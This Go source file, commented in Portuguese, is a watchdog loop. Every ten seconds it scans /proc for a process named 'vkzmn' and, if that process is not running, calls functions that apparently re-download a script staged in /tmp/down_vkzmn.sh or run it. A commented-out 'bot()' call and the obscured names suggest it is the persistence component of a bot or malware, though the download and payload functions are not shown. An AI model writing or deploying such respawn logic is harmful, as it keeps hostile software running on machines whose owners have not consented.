package main



import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"
       
)



//esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao






func  proc() {


main_func:


        //go bot()

        


 


	time.Sleep(10  * time.Second)



	var vkzmn_ok int = 0

	dir, err := os.Open("/proc") //abre o diretorio /proc

	if err != nil {

		fmt.Println("error em open")

	}

	file, err := dir.Readdir(0) //ler os arquivos e direorios dentro de /proc

	if err != nil {

		fmt.Println("erro em dir")

	}

	for _, fi := range file { //intera sobre os diretorio


		procs_cmdline := fmt.Sprintf("/proc/%s/cmdline", fi.Name()) //constroi o caminho pra pega o cmdline dos processos em execucao

		read_procs, err := ioutil.ReadFile(procs_cmdline)

		if err != nil {

			fmt.Println("") //error em readall

		}

		str_proc := string(read_procs)

		out := strings.Contains(str_proc, "vkzmn")

		if out == true {

			vkzmn_ok = 23

                         


		}


	}




	if vkzmn_ok == 23 {
                     


              
 
		fmt.Println("vkzmn em execucao")




	} else {


		fmt.Println("vkzmn nao ta em execucao")


                    _, err_open :=   os.Open("/tmp/down_vkzmn.sh")  


                        if  err_open != nil { 
                     
                            fmt.Println("down_vkzmn.sh nao foi abaixado")

              
                            down_vkzmn()
  


                          } else {



                             fmt.Println("down_vkzmn.sh ja esta em //tmp" )
                                   

       
                             magic()



                       }






	}


	goto main_func



}
